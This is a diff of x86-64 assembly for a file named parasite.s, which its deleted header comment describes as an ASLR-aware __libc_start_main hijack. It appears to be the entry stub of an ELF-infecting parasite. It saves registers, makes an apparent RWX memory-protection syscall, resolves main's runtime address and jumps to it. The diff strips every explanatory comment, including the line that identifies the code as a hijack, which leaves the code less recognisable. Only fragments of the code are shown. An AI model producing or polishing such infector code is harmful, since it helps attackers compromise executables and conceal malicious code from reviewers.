@@ -1,15 +1,12 @@
-# parasite.s – ASLR‑aware __libc_start_main hijack (robust version)
 .section .text
 .globl parasite_entry
 .type parasite_entry, @function
 
 parasite_entry:
-    # Save main's arguments
-    push   %rdi               # argc
-    push   %rsi               # argv
-    push   %rdx               # envp
+    push   %rdi               
+    push   %rsi               
+    push   %rdx               
 
-    # Save all callee‑saved registers
     push   %rbx
     push   %rbp
     push   %r12
@@ -24,7 +21,6 @@ parasite_entry:
     mov    $7, %rdx
     syscall
 
-    # Restore callee‑saved registers
     pop    %r15
     pop    %r14
     pop    %r13
@@ -32,13 +28,11 @@ parasite_entry:
     pop    %rbp
     pop    %rbx
 
-    # Resolve runtime address of main
     call   get_rip
 get_rip:
     pop    %r11
     add    delta(%rip), %r11   # ADD, not SUB
 
-    # Restore main's arguments and jump
     pop    %rdx
     pop    %rsi
     pop    %rdi
